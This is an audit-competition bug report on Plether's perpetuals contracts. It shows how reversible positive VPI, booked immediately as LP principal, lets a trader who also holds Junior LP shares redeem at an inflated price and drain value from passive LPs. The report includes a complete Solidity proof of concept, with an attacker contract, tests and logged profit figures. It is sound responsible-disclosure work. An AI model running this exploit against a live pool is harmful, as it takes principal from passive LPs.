# \#100083 [SC-Critical] Reversible positive VPI is distributed to LP principal at once, so an exiting trader-LP takes it and the remaining LPs pay the rebate

**Submitted on Nov 16th 2026 at 07:55:30 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100083
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays positive VPI. The protocol books that cash straight into LP principal as revenue, but it also records the same amount in the position's lifetime `vpiAccrued`, and the lifetime clamp lets a later skew-reducing close take it back as a rebate. The cash is therefore still owed back, yet LP share pricing treats it as earned.

An unprivileged attacker who is both a Junior LP and a trader opens, lets a matured redemption of its LP shares fund at the inflated price, and then closes at the same price. The attacker keeps its share of the VPI through the redemption and gets the full VPI back through the rebate. The rebate is paid from pool cash, so the LPs who stayed pay it out of their principal.

The PoC uses release parameters, public Router and vault calls only, and one constant 1.00 price for every tick. The attacker ends **+1,511.70 USDG** above everything it deposited and the passive LP ends **3,111.70 USDG** below its pre-attack value. The control runs the same trades at the same price but closes before the redemption is priced: the attacker loses 2,258.62 USDG in fees and the passive LP is not harmed.

## Vulnerability Details

**1. Positive VPI becomes LP principal immediately.** `OpenAccountingLib.tryBuildOpenState` sets `state.tradeCostAssets = state.vpiAssets + int256(state.executionFeeAssets)` (`OpenAccountingLib.sol:135`). After the fee is credited to the treasury, `CfdEngineSettlementSidecar.executeOpen` reports the rest as revenue:

```solidity
uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
if (poolCashInflowAssets > 0) {
    IHousePool(host.pool()).recordClaimantInflow(
        poolCashInflowAssets, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
    );
}
```

(`CfdEngineSettlementSidecar.sol:454-463`). With tranche principal present, `HousePool.recordClaimantInflow` only does `accountedAssets += amount` (`HousePool.sol:641`); no pending or reserved bucket holds it back. The next LP settlement reconciles it into tranche principal before it prices and funds matured redemptions.

**2. The same cash is recorded as reversible.** The open also writes `vpiAccrued: currentPosition.vpiAccrued + delta.posVpiAccruedDelta` (`CfdEngineSettlementSidecar.sol:517`). On a later skew-reducing close, `CloseAccountingLib.buildCloseState` clamps the rebate only so that lifetime VPI cannot go negative (`CloseAccountingLib.sol:116-118`): a close at the same price can return up to the full positive VPI the position paid. `executeClose` pays that rebate from pool cash (`delta.actionRebatePaidAssets` → `pool.payOut`).

**3. The two are priced at different times.** Between the open and the close, every LP exit is priced as if the VPI were final income. A matured redemption funded in that window moves the exiting LP's share of the VPI into irrevocable vault withdrawal escrow (`HousePool.sol` redemption phase, `TrancheVault.fundRedeemEpoch`). The rebate later comes only from the LPs who stayed.

### Sequence (PoC numbers, release parameters)

1. Junior LPs: attacker 5,900,000 USDG, passive LP 4,100,000 USDG (plus the release 1 USDG seeds). After the deposit cooldown, the attacker requests redemption of all its shares.
2. At 1.00 the attacker's trader account opens a 4,000,000 USDG long, exactly the release 0.4 skew cap of a 10,000,002 USDG pool. Positive VPI is `0.5 × 0.01 × 4,000,000² / 10,000,002 ≈ 8,000` USDG. Admission holds: `10,008,002 ≥ 4,000,000 + 10,000`.
3. At the epoch boundary anyone settles through `OrderRouter.updateMarkPrice` + `OrderRouter.settleLpEpoch` at the same 1.00 price. The VPI is reconciled into Junior principal and the attacker's redemption is fully funded at **5,904,719.998191** USDG (the free cash after reserving `L + B` covers it).
4. The attacker closes at 1.00. Close VPI is about −8,000, the clamp allows it, and after the 4 bps fee the pool pays the rebate.
5. The attacker claims the escrow and withdraws its margin: **+1,511.699299** USDG over the 6,200,000 USDG it put in. The passive LP's shares are now worth **4,096,888.300784** USDG, down **3,111.698946** USDG from **4,099,999.999730** before the attack.

### Why this is not the documented VPI design

- `SECURITY.md:872` says "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV". That is the rule this breaks: positive VPI that the protocol itself still tracks as reversible (`vpiAccrued`) inflates the NAV at which LPs exit.
- `SECURITY.md:1443`: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips". The clamp stops a trader from profiting on the trading leg alone; this attack routes the same round trip through an LP redemption, and the protocol pays out more VPI value than it ever keeps.
- `SECURITY.md:392` ("LP entry and exit pricing use the same signed exact terminal price delta and waterfall snapshot") and the withdrawal firewall (`SECURITY.md:342`) exist so that an exit cannot take value that remaining LPs later have to give back. Here an exit takes exactly such value.

## Impact Details

- **Victim:** passive LPs, who lose principal they held before the attack. In the PoC: −3,111.70 USDG. Nothing they do prevents it, and they have no way to recover it.
- **Attacker:** any unprivileged user holding a large Junior position plus a trader account. In the PoC: +1,511.70 USDG net of every fee, at one unchanged price, so with no market risk taken in the PoC.
- **Scaling:** the extracted value is about `attackerShare × VPI − fees`, with VPI up to `0.5 × vpiFactor × (0.4 D)² / D` = 8 bps of pool depth `D` per cycle. Per the program rules, "Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it."
- **Classification:** funds that passive LPs already held move to the attacker. That is "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield".

## Recommendation

Do not let reversible VPI price LP exits. Either hold positive VPI in a pending bucket that releases only as the clamp makes it final (on close or liquidation of the position that paid it), or exclude open positions' positive `vpiAccrued` from the equity used to price and fund redemptions, the same way the negative-VPI reserve is kept out of NAV.

## References

- `packages/perps/src/libraries/OpenAccountingLib.sol:135`
- `packages/perps/src/CfdEngineSettlementSidecar.sol:454-463`, `:517`
- `packages/perps/src/HousePool.sol:641` (`recordClaimantInflow`)
- `packages/perps/src/libraries/CloseAccountingLib.sol:116-118`
- `packages/perps/SECURITY.md:342`, `:392`, `:872`, `:1443`
- `packages/perps/DEPLOYMENT.md` (release `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, 4 bps execution fee, 25 bps settlement buffer, 1 USDG seeds, Senior caps 40,000,000e6 / 8,000 bps)

## Proof of Concept

## Proof of Concept|

Place the file at `packages/perps/test/perps/regression/VpiRebateLpExtraction.t.sol` and run:

```sh
forge test --root packages/perps --match-path test/perps/regression/VpiRebateLpExtraction.t.sol -vv
```

Cheatcodes: `vm.warp` only for the real 72-hour config delay, the one-hour LP epoch and seconds between Pyth ticks; `vm.roll` only inside `BasePerpTest._mockPythUpdateData`; `vm.prank` only for the untrusted passive LP. Pyth and USDG are the permitted mocks. Every trade goes through `OrderRouter.commitOrder` / `executeOrder`, LP settlement through `OrderRouter.updateMarkPrice` + `settleLpEpoch` (or the permissionless no-position `HousePool.settleLpEpoch`). No `vm.store`, no impersonated in-scope contract.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @notice Attacker smart account: one Junior LP position plus one trader account, all through public entry points.
contract VpiLpExtractor {
    IERC20 private immutable TOKEN;
    MarginClearinghouse private immutable CLEARINGHOUSE;
    TrancheVault private immutable JUNIOR;
    OrderRouter private immutable ROUTER;

    constructor(IERC20 token, MarginClearinghouse clearinghouse, TrancheVault junior, OrderRouter router) {
        TOKEN = token;
        CLEARINGHOUSE = clearinghouse;
        JUNIOR = junior;
        ROUTER = router;
    }

    receive() external payable {}

    function requestJuniorDeposit(uint256 assets) external returns (uint256 requestId) {
        TOKEN.approve(address(JUNIOR), assets);
        requestId = JUNIOR.requestDeposit(assets, address(this), address(this));
    }

    function claimJuniorDeposit(uint256 requestId) external returns (uint256 shares) {
        uint256 assets = JUNIOR.claimableDepositRequest(requestId, address(this));
        shares = JUNIOR.claimDeposit(requestId, assets, address(this), address(this));
    }

    function requestJuniorRedeem(uint256 shares) external returns (uint256 requestId) {
        requestId = JUNIOR.requestRedeem(shares, address(this), address(this));
    }

    function depositMargin(uint256 assets) external {
        TOKEN.approve(address(CLEARINGHOUSE), assets);
        CLEARINGHOUSE.deposit(address(this), assets);
    }

    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64) {
        return ROUTER.commitOrder(request);
    }

    function executeOrder(uint64 orderId, bytes[] calldata updateData)
        external
        returns (OrderV3Types.ExecutionResult memory)
    {
        return ROUTER.executeOrder(orderId, updateData);
    }

    function claimAllAndWithdraw(uint256 redeemId) external returns (uint256 redeemed, uint256 wallet) {
        uint256 shares = JUNIOR.claimableRedeemRequest(redeemId, address(this));
        redeemed = JUNIOR.claimRedeem(redeemId, shares, address(this), address(this));
        uint256 margin = CLEARINGHOUSE.balanceAssets(address(this));
        if (margin > 0) {
            CLEARINGHOUSE.withdraw(address(this), margin);
        }
        wallet = TOKEN.balanceOf(address(this));
    }
}

/// Cheatcodes and helpers:
/// - vm.warp only for the real 72-hour config delay (release Senior caps), the one-hour LP epoch, and seconds
///   between Pyth ticks; vm.roll only inside BasePerpTest._mockPythUpdateData (a later Arbitrum block).
/// - vm.prank only for the untrusted passive LP. Pyth is MockPyth (every tick at the same 1.00 price, zero
///   confidence) and USDG is the permitted mock. No vm.store, no impersonated in-scope contract, no
///   _settleLpEpochForTest/_fundJunior shortcut: LP settlement goes through the public Router.
/// - Release values: DEPLOYMENT.md risk params (vpiFactor 0.01e18, maxSkewRatio 0.4e18, 4 bps execution fee,
///   25 bps settlement buffer), 1 USDG tranche seeds, Senior caps 40,000,000e6 / 8,000 bps.
contract VpiRebateLpExtractionPoC is BasePerpTest {
    address private constant PASSIVE_LP = address(0xBEEF);
    address private constant JUNIOR_SEED = address(0x51ED01);
    address private constant SENIOR_SEED = address(0x51ED02);

    uint256 private constant PRICE = 100_000_000; // 1.00, unchanged for the whole attack
    uint256 private constant ATTACKER_LP_ASSETS = 5_900_000e6;
    uint256 private constant PASSIVE_LP_ASSETS = 4_100_000e6;
    uint256 private constant SIZE = 4_000_000e18; // 4,000,000 USDG notional = the 0.4 skew cap of a 10m pool
    uint256 private constant OPEN_MARGIN = 200_000e6;
    uint256 private constant TRADER_FUNDING = 300_000e6;

    VpiLpExtractor private attacker;
    uint256 private attackerShares;
    uint256 private passiveShares;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return JUNIOR_SEED;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SENIOR_SEED;
    }

    function setUp() public override {
        super.setUp();
        attacker = new VpiLpExtractor(
            IERC20(address(settlementToken)), clearinghouse, juniorVault, OrderRouter(address(router))
        );

        settlementToken.mint(address(attacker), ATTACKER_LP_ASSETS + TRADER_FUNDING);
        uint256 attackerDepositId = attacker.requestJuniorDeposit(ATTACKER_LP_ASSETS);

        settlementToken.mint(PASSIVE_LP, PASSIVE_LP_ASSETS);
        vm.startPrank(PASSIVE_LP);
        settlementToken.approve(address(juniorVault), PASSIVE_LP_ASSETS);
        uint256 passiveDepositId = juniorVault.requestDeposit(PASSIVE_LP_ASSETS, PASSIVE_LP, PASSIVE_LP);
        vm.stopPrank();

        vm.warp(juniorVault.depositEpochStart(attackerDepositId));
        pool.settleLpEpoch(0, 0); // no open positions: permissionless direct settlement
        attackerShares = attacker.claimJuniorDeposit(attackerDepositId);
        uint256 claimable = juniorVault.claimableDepositRequest(passiveDepositId, PASSIVE_LP);
        vm.prank(PASSIVE_LP);
        passiveShares = juniorVault.claimDeposit(passiveDepositId, claimable, PASSIVE_LP, PASSIVE_LP);

        _setSeniorCapacity(40_000_000e6, 8_000); // release caps; the 72-hour delay also clears the deposit cooldown
        attacker.depositMargin(TRADER_FUNDING);
        router.updateMarkPrice(_mockPythUpdateData(PRICE));
    }

    /// Attack: open a skew-increasing position (pays positive VPI, recognised as LP revenue at once), let the
    /// attacker's matured redemption fund at that NAV, then close at the SAME price and receive the VPI back.
    function test_ExitingTraderLpExtractsReversibleVpiFromPassiveLp() public {
        uint256 redeemId = attacker.requestJuniorRedeem(attackerShares);
        uint256 passiveBefore = juniorVault.convertToAssets(passiveShares);

        _openAtPrice(bytes32("vpi-open"));
        assertGt(pool.accountedAssets(), 10_000_002e6, "positive VPI reached the pool as revenue");

        vm.warp(pool.lpEpochStart(redeemId) + 1);
        router.updateMarkPrice(_mockPythUpdateData(PRICE)); // same 1.00 price
        router.settleLpEpoch(new bytes[](0)); // permissionless Router settlement funds the matured redemption
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(redeemId, address(attacker));
        assertEq(juniorVault.claimableRedeemRequest(redeemId, address(attacker)), attackerShares, "fully funded");

        _closeAtPrice(bytes32("vpi-close"));

        (uint256 redeemed, uint256 wallet) = attacker.claimAllAndWithdraw(redeemId);
        assertEq(redeemed, fundedAssets);
        uint256 contributed = ATTACKER_LP_ASSETS + TRADER_FUNDING;
        assertGt(wallet, contributed, "attacker ends with more USDG than it put in");

        uint256 passiveAfter = _passiveValueAfterReconcile();
        assertLt(passiveAfter, passiveBefore, "passive LP ends below its pre-attack value");

        console2.log("attacker redemption funded (USDG atoms) :", fundedAssets);
        console2.log("attacker net profit (USDG atoms)        :", wallet - contributed);
        console2.log("passive LP value before (USDG atoms)    :", passiveBefore);
        console2.log("passive LP value after  (USDG atoms)    :", passiveAfter);
        console2.log("passive LP loss (USDG atoms)            :", passiveBefore - passiveAfter);
    }

    /// Control: identical trades at the identical price, but the close executes BEFORE the redemption is priced.
    /// The VPI round trip then nets out inside the NAV the attacker exits at, and the attacker only pays fees.
    function test_Control_RoundTripBeforeRedemptionPricingExtractsNothing() public {
        uint256 redeemId = attacker.requestJuniorRedeem(attackerShares);
        uint256 passiveBefore = juniorVault.convertToAssets(passiveShares);

        _openAtPrice(bytes32("control-open"));
        _closeAtPrice(bytes32("control-close"));

        vm.warp(pool.lpEpochStart(redeemId) + 1);
        pool.settleLpEpoch(0, 0); // no open positions left
        (, uint256 wallet) = attacker.claimAllAndWithdraw(redeemId);
        uint256 contributed = ATTACKER_LP_ASSETS + TRADER_FUNDING;
        assertLt(wallet, contributed, "without the timing the attacker only pays trading fees");

        uint256 passiveAfter = _passiveValueAfterReconcile();
        assertGe(passiveAfter + 1e6, passiveBefore, "passive LP not harmed (rounding tolerance 1 USDG)");
        console2.log("control: attacker net change (USDG atoms):", int256(wallet) - int256(contributed));
        console2.log("control: passive LP before / after      :", passiveBefore, passiveAfter);
    }

    // ---------------------------------------------------------------- helpers

    function _openAtPrice(bytes32 clientId) private {
        uint64 id = attacker.commitOrder(_request(false, clientId));
        OrderV3Types.ExecutionResult memory r = attacker.executeOrder(id, _mockPythUpdateData(PRICE));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
        (uint256 size,,,,,, int256 vpiAccrued) = engine.positions(address(attacker));
        assertEq(size, SIZE);
        assertGt(vpiAccrued, 7_900e6, "open paid ~8,000 USDG positive VPI");
    }

    function _closeAtPrice(bytes32 clientId) private {
        uint64 id = attacker.commitOrder(_request(true, clientId));
        OrderV3Types.ExecutionResult memory r = attacker.executeOrder(id, _mockPythUpdateData(PRICE));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");
        (uint256 size,,,,,,) = engine.positions(address(attacker));
        assertEq(size, 0);
    }

    /// Settles one more public epoch (a 10-share probe redemption) so stored principal reflects the rebate, then
    /// values the passive LP's remaining shares plus the probe's funded assets.
    function _passiveValueAfterReconcile() private returns (uint256) {
        vm.prank(PASSIVE_LP);
        uint256 probeId = juniorVault.requestRedeem(10e9, PASSIVE_LP, PASSIVE_LP);
        vm.warp(pool.lpEpochStart(probeId) + 1);
        pool.settleLpEpoch(0, 0);
        return juniorVault.convertToAssets(juniorVault.balanceOf(PASSIVE_LP))
            + juniorVault.claimableRedeemAssets(probeId, PASSIVE_LP);
    }

    function _request(bool isClose, bytes32 clientId) private view returns (OrderV3Types.OrderRequest memory request) {
        request = OrderV3Types.OrderRequest({
            clientOrderId: clientId,
            side: CfdTypes.Side.LONG,
            sizeDelta: SIZE,
            marginDelta: isClose ? 0 : OPEN_MARGIN,
            targetPrice: isClose ? type(uint256).max : PRICE,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + 60),
                executionWindowSeconds: 60,
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: isClose ? 0 : SIZE,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }
}
```

Expected output:

```text
[PASS] test_Control_RoundTripBeforeRedemptionPricingExtractsNothing()
Logs:
  control: attacker net change (USDG atoms): -2258623334
  control: passive LP before / after      : 4099999999730 4100658622498

[PASS] test_ExitingTraderLpExtractsReversibleVpiFromPassiveLp()
Logs:
  attacker redemption funded (USDG atoms) : 5904719998191
  attacker net profit (USDG atoms)        : 1511699299
  passive LP value before (USDG atoms)    : 4099999999730
  passive LP value after  (USDG atoms)    : 4096888300784
  passive LP loss (USDG atoms)            : 3111698946
```
